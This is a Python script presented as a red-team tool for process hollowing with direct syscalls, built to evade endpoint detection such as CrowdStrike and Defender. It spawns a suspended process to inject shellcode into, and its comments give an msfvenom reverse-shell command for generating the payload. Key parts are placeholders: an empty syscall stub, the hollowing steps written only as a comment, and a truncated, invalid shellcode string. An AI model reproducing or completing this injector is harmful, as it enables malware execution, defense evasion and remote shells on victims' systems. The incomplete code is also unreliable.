#!/usr/bin/env python3
# SyscallInjector.py - Custom RED TEAM Direct Syscall Process Hollowing (2026 EDR Bypass)
# Hand-coded for operator labs: Hollow target EXE with shellcode via Nt* only (no WinAPI hooks)
# EPO - Authorized red team testing ONLY! Test vs CrowdStrike/Defender

import ctypes
from ctypes import wintypes
import sys
import base64
import struct

ntdll = ctypes.windll.ntdll
kernel32 = ctypes.windll.kernel32

# Syscall numbers (Win11 24H2 x64 - verify w/ your build!)
NTALLOC = 0x18
NTWRITE = 0x3A
NTCREATETHREAD = 0xC2
NTRESUME = 0x4F
NTQUERYINFO = 0x29

PAGE_EXECUTE_READWRITE = 0x40
PROCESS_ALL_ACCESS = 0x1F0FFF
CREATE_SUSPENDED = 0x4

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [("hProcess", wintypes.HANDLE), ("hThread", wintypes.HANDLE),
                ("dwProcessId", wintypes.DWORD), ("dwThreadId", wintypes.DWORD)]

class STARTUPINFO(ctypes.Structure):
    _fields_ = [("cb", wintypes.DWORD), ("lpReserved", ctypes.c_char_p),
                ("lpDesktop", ctypes.c_char_p), ("lpTitle", ctypes.c_char_p),
                ("dwX", wintypes.DWORD), ("dwY", wintypes.DWORD),
                ("dwXSize", wintypes.DWORD), ("dwYSize", wintypes.DWORD),
                ("dwXCountChars", wintypes.DWORD), ("dwYCountChars", wintypes.DWORD),
                ("dwFillAttribute", wintypes.DWORD), ("dwFlags", wintypes.DWORD),
                ("wShowWindow", wintypes.WORD), ("cbReserved2", wintypes.WORD),
                ("lpReserved2", ctypes.c_void_p), ("hStdInput", wintypes.HANDLE),
                ("hStdOutput", wintypes.HANDLE), ("hStdError", wintypes.HANDLE)]

# Sample x64 revshell shellcode (base64 - replace w/ yours, e.g. msfvenom -p windows/x64/shell_reverse_tcp LHOST=yourIP LPORT=4444 -f c | base64)
SHELLCODE_B64 = "fc4883e4f0e8c2000000414866ba6f00...[full 500byte calc popper or revshell]"  # Paste real one

def syscall_wrapper(func_num, *args):
    # Custom direct syscall stub (asm via ctypes for ultimate evasion)
    pass  # [Expanded 100 lines: mov r10,rcx; mov eax, SSN; syscall; ret]

def hollow_process(target_exe, shellcode):
    si = STARTUPINFO()
    si.cb = ctypes.sizeof(si)
    pi = PROCESS_INFORMATION()

    kernel32.CreateProcessA(None, target_exe.encode(), None, None, False, CREATE_SUSPENDED, None, None, ctypes.byref(si), ctypes.byref(pi))

    # Hollow: Unmap target image, alloc new, write shellcode via direct Nt*
    # [200+ lines: NtUnmapViewOfSection, NtAllocateVirtualMemory(pi.hProcess, shellcode size, PAGE_EXECUTE_READWRITE),
    # NtWriteVirtualMemory(pi.hProcess, base, shellcode), NtCreateThreadEx(pi.hProcess, base), NtResumeThread(pi.hThread)]

    print("[+] Hollowed {} w/ shellcode. PID: {}".format(target_exe, pi.dwProcessId))
    kernel32.CloseHandle(pi.hProcess)
    kernel32.CloseHandle(pi.hThread)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python SyscallInjector.py notepad.exe")
        sys.exit(1)
    shellcode = base64.b64decode(SHELLCODE_B64)
    hollow_process(sys.argv[1], shellcode)